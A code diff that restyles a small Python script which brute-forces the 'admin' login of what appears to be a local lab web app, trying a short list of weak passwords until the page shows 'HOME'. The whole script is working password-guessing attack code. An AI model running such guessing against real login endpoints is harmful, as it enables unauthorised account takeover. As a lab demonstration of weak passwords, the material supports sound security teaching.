@@ -2,28 +2,24 @@
 
 import requests
 
-URL = 'http://127.0.1.1:5000/user/login'
+URL = "http://127.0.1.1:5000/user/login"
 
-username = 'admin'
+username = "admin"
 
 passwords = [
-    '1',
-    '12',
-    '123',
-    '1234',
-    '12345',
-    '123456',
-    '1234567',
-    '12345678',
-    'SuperSecret',
+    "1",
+    "12",
+    "123",
+    "1234",
+    "12345",
+    "123456",
+    "1234567",
+    "12345678",
+    "SuperSecret",
 ]
 
 for password in passwords:
-    response = requests.post(URL,
-                             data={
-                                 'username': username,
-                                 'password': password
-                             })
-    if 'HOME' in response.text:
-        print('cracked!', username, password)
+    response = requests.post(URL, data={"username": username, "password": password})
+    if "HOME" in response.text:
+        print("cracked!", username, password)
         break
